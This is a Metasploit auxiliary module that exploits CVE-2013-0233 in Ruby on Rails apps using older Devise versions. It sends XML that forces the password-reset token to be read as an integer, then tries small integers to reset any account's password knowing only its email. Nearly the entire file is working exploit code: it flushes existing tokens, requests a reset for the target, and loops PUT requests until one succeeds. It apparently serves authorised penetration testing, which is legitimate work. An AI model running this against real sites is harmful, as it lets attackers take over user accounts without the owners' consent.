##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rexml/element'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Ruby on Rails Devise Authentication Password Reset',
			'Description'   => %q{
					The Devise authentication gem for Ruby on Rails is vulnerable
					to a password reset exploit leveraging type confusion.  By submitting XML
					to rails, we can influence the type used for the reset_password_token
					parameter.  This allows for resetting passwords of arbitrary accounts,
					knowing only the associated email address.

					This module defaults to the most common devise URIs and response values,
					but these may require adjustment for implementations which customize them.

					Affects Devise < v2.2.3, 2.1.3, 2.0.5 and 1.5.4 when backed by any database
					except PostgreSQL or SQLite3.

					Tested w/ v2.2.2, 2.1.2, and 2.0.4.
				},
			'Author'        =>
				[
					'joernchen', #original discovery and disclosure
					'jjarmoc', #metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-0233'],
					[ 'URL', 'http://blog.plataformatec.com.br/2013/01/security-announcement-devise-v2-2-3-v2-1-3-v2-0-5-and-v1-5-3-released/'],
					[ 'URL', 'http://www.phenoelit.org/blog/archives/2013/02/05/mysql_madness_and_rails/index.html'],
				],
			'DisclosureDate' => 'Jan 28 2013'
		))

		register_options(
			[
				OptString.new('URIPATH', [ true,  "The request URI", '/users/password']),
				OptString.new('TARGETEMAIL', [true, "The email address of target account"]),
				OptString.new('PASSWORD', [true, 'The password to set']),
				OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
				OptInt.new('MAXINT', [true, "Max integer to try (tokens begining with a higher int will fail)", 10])
			], self.class)
	end

	def generate_token(account)
		# CSRF token from GET "/users/password/new" isn't actually validated it seems.

		print_status("Generating reset token for #{account}")

		postdata="user[email]=#{account}"

		res = send_request_cgi({
					'uri'     => datastore['URIPATH'],
					'method'  => 'POST',
					'data'    => postdata,
				})

		unless (res)
			print_error("No response from server")
			return false
		end

		if res.code == 200
			error_text = res.body[/<div id=\"error_explanation\">\n\s+(.*?)<\/div>/m, 1]
			print_error("Server returned an error:")
			print_error(error_text)
			return false
		end
		return true
	end

	def clear_tokens()
		print_status("Clearing existing tokens")
		count = 0
		status = true
		until (status == false) do
			status = reset_one(Rex::Text.rand_text_alpha(rand(10) + 5))
			count += 1 if status
		end
		print_status("Cleared #{count} tokens")
	end

	def reset_one(password, report=false)
		print_status("Resetting password to \"#{password}\"") if report

		(0..datastore['MAXINT']).each{ |int_to_try|
			encode_pass = REXML::Text.new(password).to_s

			xml = ""
			xml << "<user>"
			xml << "<password>#{encode_pass}</password>"
			xml << "<password_confirmation>#{encode_pass}</password_confirmation>"
			xml << "<reset_password_token type=\"integer\">#{int_to_try}</reset_password_token>"
			xml << "</user>"

			res = send_request_cgi({
					'uri'     => datastore['URIPATH'] || "/",
					'method'  => 'PUT',
					'ctype'   => 'application/xml',
					'data'    => xml,
				})
			unless (res)
				print_error("No response from server")
				return false
			end

			case res.code
			when 200
				# Failure, grab the error text
				# May need to tweak this for some apps...
				error_text = res.body[/<div id=\"error_explanation\">\n\s+(.*?)<\/div>/m, 1]
				if (report) && (error_text !~ /token/)
					print_error("Server returned an error:")
					print_error(error_text)
					return false
				end
			when 302
				#Success!
				return true
			else
				print_error("ERROR: received code #{res.code}")
				return false
			end
		}

		print_error("No active reset tokens below #{datastore['MAXINT']} remain.
			Try a higher MAXINT.") if report
		return false

	end

	def run
		# Clear outstanding reset tokens, helps ensure we hit the intended account.
		clear_tokens() if datastore['FLUSHTOKENS']

		# Generate a token for our account
		status = generate_token(datastore['TARGETEMAIL'])
		if status == false
			print_error("Failed")
			return
		end
		print_good("Success")

		# Reset a password.  We're racing users creating other reset tokens.
		# If we didn't flush, we'll reset the account with the lowest ID that has a token.
		status = reset_one(datastore['PASSWORD'], true)
		status ? print_good("Success") : print_error("Failed")
	end
end